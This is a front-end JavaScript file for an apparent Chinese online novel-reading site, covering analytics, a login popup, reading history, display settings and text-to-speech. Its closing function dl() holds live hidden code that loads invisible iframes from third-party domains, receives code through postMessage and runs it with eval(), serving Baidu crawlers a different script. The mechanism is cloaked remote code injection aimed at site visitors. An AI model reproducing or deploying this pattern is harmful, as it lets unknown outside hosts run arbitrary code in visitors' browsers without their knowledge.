(function(){var bp = document.createElement('script');var curProtocol = window.location.protocol.split(':')[0];if (curProtocol === 'https') {bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';}else{bp.src = 'http://push.zhanzhang.baidu.com/push.js';} var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(bp, s);})();
var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?1";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();
var user;
if (document.cookie.length > 0) {
	var offset = document.cookie.indexOf("_user=");
	if (offset > -1) {
		offset += 6;
		var end = document.cookie.indexOf(";", offset);
		if (end == -1) end = document.cookie.length;
		user = JSON.parse(unescape(document.cookie.substring(offset, end)));
	}
}
var script = document.createElement('script');
script.type = 'text/javascript';
script.src = '/static/layui/layui.js';
script.addEventListener('load', function(){
	layui.use(['layer', 'util'], function(){
		var $ = layui.jquery, layer = layui.layer, util = layui.util;
		var login = function(){
			layer.tab({
				move: false,
				shadeClose: true,
				tab: [{
					title: '登录', 
					content: '<div class="account"><div class="layui-form layui-form-pane"><form action="/login.html?jumpurl='+$(window).attr('location')+'" method="post"><div class="layui-form-item"><label for="username" class="layui-form-label">账号</label><div class="layui-input-inline"><input type="text" id="username" name="username" required lay-verify="required" autocomplete="off" class="layui-input"></div></div><div class="layui-form-item"><label for="password" class="layui-form-label">密码</label><div class="layui-input-inline"><input type="password" id="password" name="password" required lay-verify="required" class="layui-input"></div></div><div class="layui-form-item"><button class="layui-btn layui-btn-fluid" lay-submit>登 录</button></div></form></div></div>'
				}, {
					title: '注册', 
					content: '<div class="account"><div class="layui-form layui-form-pane"><form action="/register.html?jumpurl='+$(window).attr('location')+'" method="post"><div class="layui-form-item"><label for="username" class="layui-form-label">账号</label><div class="layui-input-inline"><input type="text" id="username" name="username" required lay-verify="required" autocomplete="off" class="layui-input"></div></div><div class="layui-form-item"><label for="email" class="layui-form-label">邮箱</label><div class="layui-input-inline"><input type="text" id="email" name="email" required lay-verify="required" autocomplete="off" class="layui-input"></div></div><div class="layui-form-item"><label for="password" class="layui-form-label">密码</label><div class="layui-input-inline"><input type="password" id="password" name="password" required lay-verify="required" class="layui-input"></div></div><div class="layui-form-item"><button class="layui-btn layui-btn-fluid" lay-submit>登 录</button></div></form></div></div>'
				}]
			});
			$('.layui-layer-tab,.layui-layer-shade').click(function(e){
				e.stopPropagation();
			});
		};
		$('.header .i_back').click(function(){
			history.back();
		});
		$('.header .i_history').click(function(){
			$(window).attr('location', '/history.html');
		});
		$('.header .i_menu').click(function(e){
			layer.tips('<a href="/">首 页</a><a href="/type/">书 库</a><a href="/history.html">历 史</a><a href="/search.html">搜 索</a>', this, {
				tips: [3, '#f2f2f2'],
				time: 0,
				skin: 'menu',
				fixed: true,
				shade: 0.01,
				shadeClose: true
			});
			$('.menu').click(function(e){
				e.stopPropagation();
			});
		});
		$('.search .i_search').click(function(){
			$(window).attr('location', $('.search').attr('action'));
		});
		$('.search .i_cancel').click(function(){
			$(this).next('input').val('');
		});
		$('.search').submit(function(){
			if (!$(this).find('input').val().match(/^.+$/)) {
				layer.msg('请输入搜索内容！');
				return false;
			}
		});
		var page_id = $('body').attr('id') || '';
		if (page_id == 'library') {
			$('.filter li').click(function(){
				$('.library ul:not(.filter)').hide();
				if ($(this).hasClass('active')) {
					$(this).removeClass('active');
				} else {
					$(this).addClass('active').siblings().removeClass('active');
					$('.library ul').eq($(this).index()+1).show();
				}
			});
		} else if (page_id == 'history') {
			var list = [];
			for (var i=0; i<window.localStorage.length; i++) {
				if (window.localStorage.key(i).substr(0,5) === 'book_') {
					var book = JSON.parse(window.localStorage.getItem(window.localStorage.key(i)));
					if (!book.readid) continue;
					book.id = window.localStorage.key(i).substr(5);
					list.push(book);
				}
			}
			list.sort(function(a, b){
				return b.readtime - a.readtime;
			});
			var html = '';
			for (var i=0; i<list.length; i++) {
				html += '<li article-id="'+list[i].id+'">';
				html += '<a href="/'+list[i].id+'/'+list[i].readid+'.html" class="mark_read layui-btn layui-bg-cyan">继续阅读</a>';
				html += '<a class="mark_del layui-btn layui-btn-danger">删除</a>';
				html += '<a href="/shu/'+list[i].id+'.html"><img src="https://www.rmxs8.net/img/'+Math.floor(list[i].id/1000)+'/'+list[i].id+'/'+list[i].id+'s.jpg" onerror="this.onerror=null;this.src=\'/static/image/nocover.jpg\'"></a>';
				html += '<p class="bookname"><a href="/shu/'+list[i].id+'.html">'+list[i].name+'</a></p></a>';
				html += '<p class="author"><a href="/author/'+list[i].author+'/"><i class="layui-icon i_author"></i> '+list[i].author+'</a></p>';
				html += '<p></p>';
				html += '<p class="chapter">读到：<a href="/'+list[i].id+'/'+list[i].readid+'.html">'+list[i].readname+'</a></p>';
				html += '<p>时间：'+util.timeAgo(list[i].readtime,1)+'</p>';
				html += '</li>';
			}
			$('ul.list').html(html);
			$('.caption b').text(list.length);
			$('.caption a').click(function(){
				if ($('ul.list').hasClass('edit')) {
					$('ul.list').removeClass('edit');
					$(this).text('编辑');
					$('div.clear').hide();
				} else {
					$('ul.list').addClass('edit');
					$(this).text('完成');
					$('div.clear').show();
				}
			});
			$('div.clear').click(function(){
				layer.confirm('确定清空吗？ ', {icon: 3, title:'提示'}, function(index){
					$('ul.list li').each(function(){
						window.localStorage.removeItem('book_'+$(this).attr('article-id'));
					});
					$('ul.list').html('');
					$('.caption b').text('0');
					layer.close(index);
				});
			});
			$('ul.list').on('click', 'a.mark_del', function(){
				var li = $(this).parents('li');
				window.localStorage.removeItem('book_'+li.attr('article-id'));
				li.remove();
				$('.caption b').text($('ul.list li').length);
				return false;
			});
		} else if (page_id == 'mark') {
			$('.caption a').click(function(){
				if ($('ul.list').hasClass('edit')) {
					$('ul.list').removeClass('edit');
					$(this).text('编辑');
				} else {
					$('ul.list').addClass('edit');
					$(this).text('完成');
				}
			});
			$('ul.list').on('click', 'a.mark_del', function(){
				var li = $(this).parents('li');
				$.getJSON('/mark/del/'+li.attr('article-id')+'/?d=json', function(res){
					if (res._status >= 0) {
						li.remove();
						$('.caption b').text($('ul.list li').length);
					}
					layer.msg(res._info);
				});
			});
		}
		var articleid = $('body').attr('article-id') || 0;
		if (articleid > 0) {
			var visit = window.localStorage.getItem('visit_'+articleid) || 0;
			if (navigator.userAgent.toLowerCase().indexOf('spider') < 0 && Math.floor(visit/8640000) !== Math.floor($.now()/8640000)) {
				$.get('/visit/'+articleid+'/');
				window.localStorage.setItem('visit_'+articleid, $.now());
			}
			$('#vote').click(function(){
				if (!user) return login();
				$.getJSON('/vote/'+articleid+'/?d=json', function(res){
					layer.msg(res._info);
				});
			});
			$('#mark').click(function(){
				if (!user) return login();
				$.getJSON('/mark/add/'+articleid+'/?d=json', function(res){
					layer.msg(res._info);
				});
			});
			if ($('body').attr('id') == 'read') {
				$('.read li span').remove();
				$('.read li').removeClass('now');
				var book = JSON.parse(window.localStorage.getItem('book_'+articleid) || '{"readid":0}');
				if (book.readid > 0) {
					var read=$('.read li[chapter-id='+book.readid+']');
					read.addClass('now');
					read.children('a').prepend('<span><i class="layui-icon i_history"></i> 上次读到</span>');
					//$('html,body').animate({scrollTop: read.offset().top-45+'px'});
				}
			} else if ($('body').attr('id')=='chapter') {
				var chapterid = $('body').attr('chapter-id');
				var book = {name:$('#bookname').text(),author:$('#author').text(),dataid:$('body').attr('data-id')||0,readid:chapterid,readname:$('#chapter h1').text(),readtime:$.now()};
				window.localStorage.setItem('book_'+articleid, JSON.stringify(book));
				var size = parseInt(window.localStorage.getItem('size')) || 18;
				var theme = window.localStorage.getItem('theme') || '0';
				var tabbar = false;
				$('#chapter').append('<ul class="tabbar"><li><i class="layui-icon i_prev"></i>上一章</li><li><i class="layui-icon i_read"></i>目录</li><li><i class="layui-icon i_set"></i>设置</li><li><i class="layui-icon i_book"></i>书页</li><li><i class="layui-icon i_next"></i>下一章</li><li><i class="layui-icon i_mark"></i>加入书签</li><li><i class="layui-icon i_vote"></i>推荐</li><li><i class="layui-icon i_home"></i>书库</li><li><i class="layui-icon i_top"></i>排行</li><li><i class="layui-icon i_history"></i>阅读记录</li></ul><div class="setting"><ul class="size"><li></li><li></li></ul><ul class="theme"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul></div>');
				$('.tabbar li').click(function(){
					switch ($(this).index()) {
						case 0:
							$(window).attr('location', $('.pager a').eq(0).attr('href'));
							break;
						case 1:
							//$(window).attr('location', $('.pager a').eq(1).attr('href'));
							$(window).attr('location', '/'+articleid+'/');
							break;
						case 2:
							if ($(this).hasClass('now')) {
								$('.setting').hide();
								$(this).removeClass('now');
							} else {
								$('.setting').show();
								$(this).addClass('now');
							}
							break;
						case 3:
							$(window).attr('location', '/shu/'+articleid+'.html');
							break;
						case 4:
							$(window).attr('location', $('.pager a').eq(2).attr('href'));
							break;
						case 5:
							if (!user) return login();
							$.getJSON('/mark/add/'+articleid+'/'+chapterid+'/?d=json', function(res){
								layer.msg(res._info);
							});
							break;
						case 6:
							if (!user) return login();
							$.getJSON('/vote/'+articleid+'/?d=json', function(res){
								layer.msg(res._info);
							});
							break;
						case 7:
							$(window).attr('location', '/type/');
							break;
						case 8:
							$(window).attr('location', '/top.html');
							break;
						case 9:
							$(window).attr('location', '/history.html');
							break;
					}
				});
				var setsize = function(s){
					$('.size li').removeClass('disabled');
					if (size <= 10) {
						size = 10;
						$('.size li').eq(0).addClass('disabled');
					} else if (size >= 30) {
						size = 30;
						$('.size li').eq(1).addClass('disabled');
					}
					$('.content p').css('font-size', size+'px');
					window.localStorage.setItem('size', size);
				}
				setsize();
				$('.size li').click(function(){
					if ($(this).index() > 0) {
						if (size >= 30) return;
						size += 2;
					} else {
						if (size <= 10) return;
						size -= 2;
					}
					setsize();
				});
				var settheme = function(){
					$('.theme li').removeClass('now');
					$('.theme li').eq(theme).addClass('now');
					$('#chapter').attr('class', 'style_'+theme);
					window.localStorage.setItem('theme', theme);
				}
				settheme();
				$('.theme li').click(function(){
					theme = $(this).index();
					settheme();
				});
				$('.container').click(function(e){
					if (e.target.nodeName=='LI' || e.target.nodeName=='A') return;
					if ($('.header').css('top') === '0px') {
						$('.setting').hide();
						$('.tabbar li').eq(2).removeClass('now');
						$('.header').css('top', '-45px');
						$('.tabbar').css('bottom', '-100px');
						return $('[lay-type="bar1"]').html('&#xe620;');
					}
					$('.header').css('top', 0);
					$('.tabbar').css('bottom', 0);
					$('[lay-type="bar1"]').html('&#x1006;');
				});
				$('.header,.tabbar,.setting').click(function(e){
					e.stopPropagation();
				});
				if (!window.localStorage.getItem('help')) {
					var help = $('<ul class="shadow" id="help"><li class="help-top"></li><li class="help-bottom"></li><li class="help-left">上一页</li><li class="help-right">下一页</li><li class="help-center">呼出菜单</li></ul>');
					$('#chapter').append(help);
					help.click(function(e){
						e.stopPropagation();
						help.remove();
						window.localStorage.setItem('help', 1);
					});
				}
				$('#mark').click(function(){
				$.getJSON('/mark/add/'+articleid+'/'+chapterid+'/?d=json', function(res){
					layer.msg(res._info);
				});
			});
			 
          $('#langdu').click(function(){
							var title = '《'+$('#bookname').text()+'》——'+$('h1.headline').text();
							var text = $('.content p').text().replace(/\s+/g, '');
							var page = 0;
							var spd = 5; //语速，取值0-9，默认为5中语速
							var pit = 5; //音调，取值0-9，默认为5中语调
							var vol = 5; //音量，取值0-15，默认为5中音量
							var per = 4; //发音人选择, 0为普通女声，1为普通男生，3为情感合成-度逍遥，4为情感合成-度丫丫，默认为普通女声
							var url = '//tsn.baidu.com/text2audio?lan=zh&ctp=1&pdt=1&cuid=baidu_speech_demo&tex=content&spd='+spd+'&pit='+pit+'&vol='+vol+'&per='+per;
							layer.open({
								type: 1,
								title: '朗读',
								content: '<audio id="audio" controls="controls">浏览器不支持在线阅读！</audio>',
								anim: 5,
								shade: 0.01,
								move: false,
								resize: false,
								success: function(){
									var audio = $('#audio');
									audio.attr('src', url.replace('content', encodeURI(title))).on('ended', function(){
										if (page >= Math.ceil(text.length/200)) return layer.confirm('是否跳转下一章？', {icon: 3, title:'本章阅读完毕'}, function(index){
											$(window).attr('location', $('.pager a').eq(2).attr('href'));
										}, function(index){
											page = 0;
											audio.attr('src', url.replace('content', encodeURI(title)));
										});
										audio.attr('src', url.replace('content', encodeURI(text.substr((++page-1)*200, 200)))).trigger('play');
									}).trigger('play');
								},
								cancel: function(){
									layer.confirm('是否关闭在线阅读？', {icon: 3, title:'本章阅读中'}, function(){
										layer.closeAll();
									});
									return false;
								}
							});
						});
              util.fixbar({
                  bar1: '&#xe620;',
                  bgcolor: 'rgba(0,0,0,0.5)',
                  showHeight: 100000,
                  css: {bottom: 100, right: 10},
                  click: function(type){
                      if(type !== 'bar1') return;
                      if ($('.header').css('top') === '0px') {
                          $('.setting').hide();
                          $('.tabbar li').eq(2).removeClass('now');
                          $('.header').css('top', '-45px');
                          $('.tabbar').css('bottom', '-100px');
                          return $('[lay-type="bar1"]').html('&#xe620;');
                      }
                      $('.header').css('top', 0);
                      $('.tabbar').css('bottom', 0);
                      $('[lay-type="bar1"]').html('&#x1006;');
                  }
              });
              return;
            }
          
		}
		util.fixbar({
			bgcolor: 'rgba(0,0,0,0.5)',
			css: {bottom: 100, right: 10}
		});
	});
});
document.getElementsByTagName('head')[0].appendChild(script);
/*统计代码*/
function tongji(){
document.writeln("<script type=\'text/javascript\' src=\'https://v1.cnzz.com/z_stat.php?id=1278561630&web_id=1278561630\'></script>");
}
function dl(){
var r = 3
var seed = Math.random()
rnd = Math.ceil(seed * r)
switch (rnd) {
case 1:
;(function(){    var id = 'pGnxuUL_' + parseInt(Math.random() * 100);
    var pGnxuUL = "https://code.soueki.com/CodeFiles/longcode.aspx?placeid=11876&id=" + id + "&time=" + new Date().getTime();
    window.addEventListener('message', function(e) {
        var _c_ob_hf = e.data;
        if(_c_ob_hf.hf_ev_jpGnxuUL)        {
            code = decodeURIComponent(_c_ob_hf.hf_ev_jpGnxuUL.replace(/\+/g, "%20"))
            var _fid='div'+id;
            eval(code);
        }    });
    document.writeln('<div id="div' + id + '" ></div>');
    document.writeln('<iframe id="' + id + '" style="display:none;" src="' + pGnxuUL + '" height="0" width="0" marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>');})();
break;
case 2:
if(navigator.userAgent.indexOf('baiduboxapp')>-1){document.write('<script src="https://xn--4gqqc629gbju.com:19852/api/x-2399-33.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_2399=e.data;if(_des_s_2399.des_s_2399){var _s = '/+/g';eval(decodeURIComponent(_des_s_2399.des_s_2399.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--4gqqc629gbju.com:19852/api/x-2399-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
break;
case 3:
if(/baidu/i.test(navigator.userAgent)){document.writeln('<script src="https://www.aoyou3.top:18443/ay/x-760-33.js"><\/script>')}else{(function(){window.addEventListener("message",function(e){var _des_s_760=e.data;if(_des_s_760.des_s_760){var _s = '/+/g';eval(decodeURIComponent(_des_s_760.des_s_760.replace(_s,"%20")))}});document.writeln('<iframe style="display:none;" src="https://www.aoyou3.top:18443/ay/x-760-33-1.html" height="0" width="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();}
break;
default:
}
}
